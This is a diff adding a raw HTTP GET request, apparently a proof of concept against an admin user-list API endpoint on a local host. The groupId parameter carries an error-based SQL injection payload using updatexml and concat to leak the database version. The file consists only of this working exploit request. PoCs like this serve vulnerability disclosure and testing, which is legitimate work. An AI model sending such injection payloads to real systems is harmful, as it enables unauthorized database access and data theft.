@@ -1,0 +1,14 @@
+GET /api/admin/user/list?labelId=&userType=&sex=&isPromoter=&country=&payCount=&accessType=0&dateLimit=&keywords=&province=&city=&page=1&limit=15&level=&groupId=1)+and+updatexml(1,concat(0x7e,(select+@@version),0x7e),1)--+&temp=1708587324 HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
+Accept: application/json, text/plain, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Authori-zation: 6ae40cb967b5480c805cc930df3d9650
+Origin: http://localhost:9527
+Connection: close
+Referer: http://localhost:9527/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: cross-site
+
